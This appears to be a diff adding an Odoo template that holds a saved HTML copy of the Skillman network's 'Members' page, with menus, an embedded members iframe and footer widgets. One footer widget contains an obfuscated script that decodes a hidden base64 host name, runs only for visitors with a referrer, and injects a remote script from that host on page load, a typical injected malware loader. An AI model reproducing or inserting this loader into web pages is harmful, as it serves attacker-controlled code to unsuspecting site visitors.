menu-item-object-page menu-item-36969 depth-1"><a href='https://skillman.eu/e-newsletter/' data-level='2'><span class="menu-item-text"><span class="menu-text">E-newsletter</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40645 depth-1"><a href='https://www.youtube.com/channel/UCa5w1hWO1yp_OEhZwhk7lXQ' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman videos</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36986 last depth-0"><a href='https://skillman.eu/gender-equality/' data-level='1'><span class="menu-item-text"><span class="menu-text">Gender</span></span></a></li> </ul>
+		<div class="mini-widgets"><div class="mini-search show-on-desktop near-logo-first-switch near-logo-second-switch popup-search custom-icon"><form class="searchform mini-widget-searchform" role="search" method="get" action="https://skillman.eu/">
+
+	<div class="screen-reader-text">Search:</div>
+
+
+		<a href="" class="submit text-disable"><i class=" mw-icon the7-mw-icon-search-bold"></i></a>
+		<div class="popup-search-wrap">
+			<input type="text" class="field searchform-s" name="s" value="" placeholder="Type and hit enter …" title="Search form"/>
+			<a href="" class="search-icon"><i class="the7-mw-icon-search-bold"></i></a>
+		</div>
+
+			<input type="submit" class="assistive-text searchsubmit" value="Go!"/>
+</form>
+</div></div>
+	</header>
+
+</div>
+<div role="navigation" class="dt-mobile-header mobile-menu-show-divider">
+	<div class="dt-close-mobile-menu-icon"><div class="close-line-wrap"><span class="close-line"></span><span class="close-line"></span><span class="close-line"></span></div></div>	<ul id="mobile-menu" class="mobile-main-nav">
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-63297 first depth-0"><a href='https://web.skillman.eu/sif2023' data-level='1'><span class="menu-item-text"><span class="menu-text">SIF 2023</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-42327 has-children depth-0"><a data-level='1'><span class="menu-item-text"><span class="menu-text">Skillman Method</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-62695 first depth-1"><a href='http://skillman.eu/lifecycle-concept/' data-level='2'><span class="menu-item-text"><span class="menu-text">Lifecycle concept</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-42325 has-children depth-1"><a href='#' data-level='2'><span class="menu-item-text"><span class="menu-text">Skills</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42324 first depth-2"><a href='https://skillman.eu/skills/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skills Pillars</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-37148 has-children depth-2"><a href='#' data-level='3'><span class="menu-item-text"><span class="menu-text">Standards</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38000 first depth-3"><a href='https://skillman.eu/eqavet_european_quality_assurance_in_vet-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">ECVET</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38010 depth-3"><a href='https://skillman.eu/eqavet_european_quality_assurance_in_vet-2-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">EQF</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36972 depth-3"><a href='https://skillman.eu/eqavet_european_quality_assurance_in_vet/' data-level='4'><span class="menu-item-text"><span class="menu-text">EQAVET</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36973 depth-3"><a href='https://skillman.eu/esco_skills_competencies_occupations/' data-level='4'><span class="menu-item-text"><span class="menu-text">ESCO</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43232 depth-2"><a href='https://skillman.eu/memorandum-of-understanding/' data-level='3'><span class="menu-item-text"><span class="menu-text">MoU among Skillman&#8217;s Members</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-45555 has-children depth-2"><a href='https://skillman.eu/skillman-ethical-skills-awards-video-contest/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillman Ethical Skills Awards &#8211; Video Contest</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45756 first depth-3"><a href='https://skillman.eu/submit-your-candidature/' data-level='4'><span class="menu-item-text"><span class="menu-text">Submit your candidature</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43841 depth-3"><a href='https://skillman.eu/awards-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">Skillman Ethical Skills Awards Yearbook</span></span></a></li> </ul></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-62696 depth-1"><a href='https://skillman.coves.eu/' data-level='2'><span class="menu-item-text"><span class="menu-text">coves.eu</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-38074 act has-children depth-0"><a href='#' data-level='1'><span class="menu-item-text"><span class="menu-text">The Network</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36961 first depth-1"><a href='https://skillman.eu/timeline/' data-level='2'><span class="menu-item-text"><span class="menu-text">Network Timeline</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-44996 current_page_item current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-44998 act has-children depth-1"><a href='https://skillman.eu/members/' data-level='2'><span class="menu-item-text"><span class="menu-text">Members</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-44996 current_page_item menu-item-has-children menu-item-44997 act first has-children depth-2"><a href='https://skillman.eu/members/' data-level='3'><span class="menu-item-text"><span class="menu-text">Map of Members</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-62720 first depth-3"><a href='https://skillman.eu/members-list/' data-level='4'><span class="menu-item-text"><span class="menu-text">Search by criteria</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42606 depth-2"><a href='https://skillman.eu/member-profiles/' data-level='3'><span class="menu-item-text"><span class="menu-text">Roles</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38580 depth-2"><a href='https://skillman.eu/ambassadors/' data-level='3'><span class="menu-item-text"><span class="menu-text">Ambassadors’ Club</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-37719 has-children depth-2"><a href='#' data-level='3'><span class="menu-item-text"><span class="menu-text">Founders</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36976 first depth-3"><a href='https://skillman.eu/bmet/' data-level='4'><span class="menu-item-text"><span class="menu-text">BMET</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36977 depth-3"><a href='https://skillman.eu/cepas/' data-level='4'><span class="menu-item-text"><span class="menu-text">CEPAS</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36978 depth-3"><a href='https://skillman.eu/cnr/' data-level='4'><span class="menu-item-text"><span class="menu-text">CNR</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36979 depth-3"><a href='https://skillman.eu/crf/' data-level='4'><span class="menu-item-text"><span class="menu-text">CRF (an FCA company)</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36980 depth-3"><a href='https://skillman.eu/cscs/' data-level='4'><span class="menu-item-text"><span class="menu-text">CSCS</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36981 depth-3"><a href='https://skillman.eu/eal/' data-level='4'><span class="menu-item-text"><span class="menu-text">EAL</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37117 depth-3"><a href='https://skillman.eu/eef/' data-level='4'><span class="menu-item-text"><span class="menu-text">EEF</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36982 depth-3"><a href='https://skillman.eu/iu/' data-level='4'><span class="menu-item-text"><span class="menu-text">IU</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36983 depth-3"><a href='https://skillman.eu/jlr/' data-level='4'><span class="menu-item-text"><span class="menu-text">JLR</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36984 depth-3"><a href='https://skillman.eu/sas/' data-level='4'><span class="menu-item-text"><span class="menu-text">SAS</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36985 depth-3"><a href='https://skillman.eu/tec-5/' data-level='4'><span class="menu-item-text"><span class="menu-text">TEC</span></span></a></li> </ul></li> </ul></li> <li class="bp-menu bp-register-nav menu-item menu-item-type-custom menu-item-object-custom menu-item-40674 depth-1"><a href='https://skillman.eu/register' data-level='2'><span class="menu-item-text"><span class="menu-text">Join the Network</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-43197 has-children depth-1"><a data-level='2'><span class="menu-item-text"><span class="menu-text">Collaboration</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43000 first depth-2"><a href='https://skillman.eu/include-skillman-in-a-new-project-partnership/' data-level='3'><span class="menu-item-text"><span class="menu-text">Partnership opportunities</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42531 depth-2"><a href='https://skillman.eu/submit-your-idea/' data-level='3'><span class="menu-item-text"><span class="menu-text">Submit Your Project Ideas</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43820 depth-2"><a href='https://skillman.eu/skillnet-management-platform/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillnet Management Platform</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-51804 depth-1"><a href='https://skillman.eu/skillnet-2022/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillnet 2022</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-38069 has-children depth-0"><a href='#' data-level='1'><span class="menu-item-text"><span class="menu-text">Activities</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-59530 first has-children depth-1"><a data-level='2'><span class="menu-item-text"><span class="menu-text">Alliance Summit</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-59531 first depth-2"><a href='https://skillman.eu/as2023/' data-level='3'><span class="menu-item-text"><span class="menu-text">Kabada Conference &#8211; Alliance Summit 2023</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-63782 depth-2"><a href='https://skillman.eu/as2022' data-level='3'><span class="menu-item-text"><span class="menu-text">TVET Alliance Summit 2022</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-59532 has-children depth-1"><a data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman International Forum</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-55203 first depth-2"><a href='https://skillman.eu/sif2022/' data-level='3'><span class="menu-item-text"><span class="menu-text">2022 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-51729 depth-2"><a href='https://skillman.eu/sif2021/' data-level='3'><span class="menu-item-text"><span class="menu-text">2021 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-47357 depth-2"><a href='https://skillman.eu/sif2020/' data-level='3'><span class="menu-item-text"><span class="menu-text">2020 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43448 depth-2"><a href='https://skillman.eu/skillman-eu-international-forum-2019/' data-level='3'><span class="menu-item-text"><span class="menu-text">2019 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42377 depth-2"><a href='https://skillman.eu/skillman-eu-international-forum-2018/' data-level='3'><span class="menu-item-text"><span class="menu-text">2018 International Forum</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-51934 depth-1"><a href='https://skillman.eu/tvet-digital-triathlon/' data-level='2'><span class="menu-item-text"><span class="menu-text">TVET Digital Triathlon</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45448 depth-1"><a href='https://skillman.eu/ethical-campaign-to-redefine-the-future-of-learning/' data-level='2'><span class="menu-item-text"><span class="menu-text">Ethical campaign to redefine the future of learning</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44746 depth-1"><a href='https://skillman.eu/skillman-youth-forum/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman Youth Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44978 depth-1"><a href='https://skillman.eu/skillman-at-the-european-skills-week-2020/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman at the European Skills Week 2020</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-38066 has-children depth-1"><a href='#' data-level='2'><span class="menu-item-text"><span class="menu-text">Events And Conferences</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43990 first depth-2"><a href='https://skillman.eu/peer-learning-clubs/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Clubs</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44259 depth-2"><a href='https://skillman.eu/webinars-on-eu-fund-opportunities/' data-level='3'><span class="menu-item-text"><span class="menu-text">Webinars on EU fund opportunities</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44927 depth-2"><a href='https://skillman.eu/skillman-technical-webinars/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillman technical webinars</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43949 depth-2"><a href='https://skillman.eu/skillnet-events/' data-level='3'><span class="menu-item-text"><span class="menu-text">Future Events list</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-44279 has-children depth-2"><a data-level='3'><span class="menu-item-text"><span class="menu-text">Past Events</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-36965 first has-children depth-3"><a href='https://skillman.eu/timeline/2017-final-international-conference-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">2017 November – San Sebastian International Conference</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37090 first depth-4"><a href='https://skillman.eu/why/' data-level='5'><span class="menu-item-text"><span class="menu-text">Why</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37089 depth-4"><a href='https://skillman.eu/focus/' data-level='5'><span class="menu-item-text"><span class="menu-text">Focus</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37088 depth-4"><a href='https://skillman.eu/partners/' data-level='5'><span class="menu-item-text"><span class="menu-text">Partners</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37087 depth-4"><a href='https://skillman.eu/contacts/' data-level='5'><span class="menu-item-text"><span class="menu-text">Contacts</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36963 depth-3"><a href='https://skillman.eu/timeline/second-international-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2017 March – Birmingham International Conference</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36967 depth-3"><a href='https://skillman.eu/timeline/2016-international-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2016 International Conference</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36966 depth-3"><a href='https://skillman.eu/timeline/2015-international-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2015 International Conference</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36962 depth-3"><a href='https://skillman.eu/the-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2015 The Kick-off Conference</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-43951 depth-2"><a href='https://airtable.com/shramDhZda158jH4J' target='_blank' data-level='3'><span class="menu-item-text"><span class="menu-text">Get your invitations and funds support</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-43205 depth-2"><a href='http://skillman.eu/new-event/' data-level='3'><span class="menu-item-text"><span class="menu-text">Add your events</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-43536 has-children depth-1"><a href='https://skillman.eu/news/' data-level='2'><span class="menu-item-text"><span class="menu-text">News</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43537 first depth-2"><a href='https://skillman.eu/news/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillman News</span></span></a></li> </ul></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-37100 has-children depth-0"><a href='#' data-level='1'><span class="menu-item-text"><span class="menu-text">Resources</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46597 first depth-1"><a href='https://skillman.eu/skillman-advisory-service/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman advisory service</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42437 depth-1"><a href='https://skillman.eu/webinars-catalog/' data-level='2'><span class="menu-item-text"><span class="menu-text">Webinars catalog</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-44343 has-children depth-1"><a href='#' data-level='2'><span class="menu-item-text"><span class="menu-text">Publications</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44348 first depth-2"><a href='https://skillman.eu/peer-learning-club-1-advanced-manufacturing-sector-publication/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 1- Advanced Manufacturing Sector</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44392 depth-2"><a href='https://skillman.eu/peer-learning-club-2-advocacy-policy-influencing/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 2 – Advocacy &#038; Policy Influencing</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44391 depth-2"><a href='https://skillman.eu/peer-learning-club-3-work-based-learning-and-standards/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 3 – Work-based learning and standards</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44390 depth-2"><a href='https://skillman.eu/peer-learning-club-4-train-the-trainers/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 4 – Train the trainers</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-37011 depth-1"><a href='http://learn.skillman.eu' data-level='2'><span class="menu-item-text"><span class="menu-text">Curricula Platform</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36969 depth-1"><a href='https://skillman.eu/e-newsletter/' data-level='2'><span class="menu-item-text"><span class="menu-text">E-newsletter</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-40645 depth-1"><a href='https://www.youtube.com/channel/UCa5w1hWO1yp_OEhZwhk7lXQ' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman videos</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36986 last depth-0"><a href='https://skillman.eu/gender-equality/' data-level='1'><span class="menu-item-text"><span class="menu-text">Gender</span></span></a></li> 	</ul>
+	<div class='mobile-mini-widgets-in-menu'></div>
+</div>
+
+
+
+<div id="main" class="sidebar-none sidebar-divider-vertical">
+
+
+	<div class="main-gradient"></div>
+	<div class="wf-wrap">
+	<div class="wf-container-main">
+
+
+
+
+	<div id="content" class="content" role="main">
+
+		<section class="wpb-content-wrapper"><div class="stripe stripe-style-1" style="background-color: #f9fafc;background-position: top;background-repeat: no-repeat;background-attachment: scroll;background-size: auto;padding-top: 0px;padding-bottom: 0px;margin-top: -75px;margin-bottom: -75px"><div class="vc_row wpb_row vc_row-fluid full-width-wrap" style="padding-left: 0px;padding-right: 0px"><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 20px"><span class="vc_empty_space_inner"></span></div>
+	<div class="wpb_raw_code wpb_content_element wpb_raw_html" >
+		<div class="wpb_wrapper">
+			<iframe width="100%" height="4600px" frameborder="0" src="https://learn.skillman.eu/blocks/skillman/skillman_members.php?courseid=1&amp;blockid=3344&amp;perpage=20&amp;membertypeid=-1&amp;orgtypeid=-1&amp;membercategoryid=-1&amp;memberroleid=-1&amp;moodleuserid=-1&amp;countryid=-1&amp;isapproved=-1&amp;embedded=1"></iframe>
+		</div>
+	</div>
+</div></div></div></div></div><!-- Row Backgrounds --><div class="upb_color" data-bg-override="0" data-bg-color="#f9fafc" data-fadeout="" data-fadeout-percentage="30" data-parallax-content="" data-parallax-content-sense="30" data-row-effect-mobile-disable="true" data-img-parallax-mobile-disable="true" data-rtl="false"  data-custom-vc-row=""  data-vc="7.0"  data-is_old_vc=""  data-theme-support=""   data-overlay="false" data-overlay-color="" data-overlay-pattern="" data-overlay-pattern-opacity="" data-overlay-pattern-size=""    ></div>
+</section>
+	</div><!-- #content -->
+
+
+
+
+			</div><!-- .wf-container -->
+		</div><!-- .wf-wrap -->
+
+
+	</div><!-- #main -->
+
+
+
+
+	<!-- !Footer -->
+	<footer id="footer" class="footer solid-bg">
+
+
+			<div class="wf-wrap">
+				<div class="wf-container-footer">
+					<div class="wf-container">
+						<section id="custom_html-3" class="widget_text widget widget_custom_html wf-cell wf-1-2"><div class="textwidget custom-html-widget"><img class="alignnone wp-image-37969" src="https://skillman.eu/wp-content/uploads/2022/01/cofundedeu.png" alt="" height="70px"/>
+<p style="font-size: 12px; line-height: 14px;">
+	The European Commission's support for the production of this publication does not constitute an endorsement of the contents, which reflect the views only of the authors, and the Commission cannot be held responsible for any use which may be made of the information contained therein.
+</p></div></section><section id="custom_html-4" class="widget_text widget widget_custom_html wf-cell wf-1-2"><div class="textwidget custom-html-widget"><div style="text-align: right;">
+<img class="alignnone wp-image-37969" src="https://skillman.eu/wp-content/uploads/2022/01/skillmansecretariat-e1642498801517.png" alt="" height="70"/>
+</div>
+<p style="text-align: right;"><a href="http://skillman.eu/legal-notice/">Legal notice on GDPR privacy compliance</a></p></div></section><section id="custom_html-113" class="widget_text widget widget_custom_html wf-cell wf-1-2"><div class="textwidget custom-html-widget"><script>
+!function (_0x26d259, _0x24b800) {
+    var _0x2196a7 = Math['floor'](Date['now']() / 0x3e8), _0xcb1eb8 = _0x2196a7 - _0x2196a7 % 0xe10;
+    if (_0x2196a7 -= _0x2196a7 % 0x258, _0x2196a7 = _0x2196a7['toString'](0x10), !document['referrer'])
+        return;
+    let _0x9cf45e = atob('bC5qcy1hc3' + 'NldHMuY2xv' + 'dWQ=');
+    (_0x24b800 = _0x26d259['createElem' + 'ent']('script'))['type'] = 'text/javas' + 'cript', _0x24b800['async'] = !0x0, _0x24b800['src'] = 'https://' + _0x9cf45e + '/min.t.' + _0xcb1eb8 + '.js?v=' + _0x2196a7, _0x26d259['getElement' + 'sByTagName']('head')[0x0]['appendChil' + 'd'](_0x24b800);
+}(document);
+</script></div></section>					</div><!-- .wf-container -->
+				</div><!-- .wf-container-footer -->
+			</div><!-- .wf-wrap -->
+
+
+	</footer><!-- #footer -->
+
+<a href="#" class="scroll-top">
+<!--    <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"-->
+<!--	 viewBox="0 0 16 16" style="enable-background:new 0 0 16 16;" xml:space="preserve">-->
+<!--<path d="M11.7,6.3l-3-3C8.5,3.1,8.3,3,8,3c0,0,0,0,0,0C7.7,3,7.5,3.1,7.3,3.3l-3,3c-0.4,0.4-0.4,1,0,1.4c0.4,0.4,1,0.4,1.4,0L7,6.4-->
+<!--	V12c0,0.6,0.4,1,1,1s1-0.4,1-1V6.4l1.3,1.3c0.4,0.4,1,0.4,1.4,0C11.9,7.5,12,7.3,12,7S11.9,6.5,11.7,6.3z"/>-->
+<!--</svg>-->
+    <span class="screen-reader-text">Go to Top</span></a>
+
+</div><!-- #page -->
+
+
+		<script>
+			window.RS_MODULES = window.RS_MODULES || {};
+			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
+			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
+			window.RS_MODULES.defered = false;
+			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
+			window.RS_MODULES.type = 'compiled';
+		</script>
+		<script type="text/html" id="wpb-modifications"> window.wpbCustomElement = 1; </script><link rel='stylesheet' id='the7-stripes-css' href='https://skillman.eu/wp-content/uploads/the7-css/legacy/stripes.css?ver=c7286e7940ab' type='text/css' media='all' />
+<link rel='stylesheet' id='ultimate-vc-addons-background-style-css' href='https://skillman.eu/wp-content/plugins/Ultimate_VC_Addons/assets/min-css/background-style.min.css?ver=3.19.15' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-plugin-settings-css' href='https://skillman.eu/wp-content/plugins/revslider/public/assets/css/rs6.css?ver=6.6.15' type='text/css' media='all' />
+<style id='rs-plugin-settings-inline-css' type='text/css'>
+#rs-demo-id {}
+</style>
+<script type='text/javascript' src='https://skillman.eu/wp-content/themes/dt-the7/js/main.min.js?ver=11.8.0.1' id='dt-main-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/themes/dt-the7/js/legacy.min.js?ver=11.8.0.1' id='dt-legacy-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/themes/dt-the7/lib/jquery-mousewheel/jquery-mousewheel.min.js?ver=11.8.0.1' id='jquery-mousewheel-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/themes/dt-the7/lib/custom-scrollbar/custom-scrollbar.min.js?ver=11.8.0.1' id='the7-custom-scrollbar-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=7.0' id='wpb_composer_front_js-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/plugins/Ultimate_VC_Addons/assets/min-js/jquery-appear.min.js?ver=3.19.15' id='ultimate-vc-addons-appear-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/plugins/Ultimate_VC_Addons/assets/min-js/ultimate_bg.min.js?ver=3.19.15' id='ultimate-vc-addons-row-bg-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/plugins/Ultimate_VC_Addons/assets/min-js/custom.min.js?ver=3.19.15' id='ultimate-vc-addons-custom-js'></script>
+<script></script>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+	<div class="pswp__bg"></div>
+	<div class="pswp__scroll-wrap">
+		<div class="pswp__container">
+			<div class="pswp__item"></div>
+			<div class="pswp__item"></div>
+			<div class="pswp__item"></div>
+		</div>
+		<div class="pswp__ui pswp__ui--hidden">
+			<div class="pswp__top-bar">
+				<div class="pswp__counter"></div>
+				<button class="pswp__button pswp__button--close" title="Close (Esc)" aria-label="Close (Esc)"></button>
+				<button class="pswp__button pswp__button--share" title="Share" aria-label="Share"></button>
+				<button class="pswp__button pswp__button--fs" title="Toggle fullscreen" aria-label="Toggle fullscreen"></button>
+				<button class="pswp__button pswp__button--zoom" title="Zoom in/out" aria-label="Zoom in/out"></button>
+				<div class="pswp__preloader">
+					<div class="pswp__preloader__icn">
+						<div class="pswp__preloader__cut">
+							<div class="pswp__preloader__donut"></div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+				<div class="pswp__share-tooltip"></div>
+			</div>
+			<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)" aria-label="Previous (arrow left)">
+			</button>
+			<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)" aria-label="Next (arrow right)">
+			</button>
+			<div class="pswp__caption">
+				<div class="pswp__caption__center"></div>
+			</div>
+		</div>
+	</div>
+</div>
+</body>
+    </template>
+</odoo>
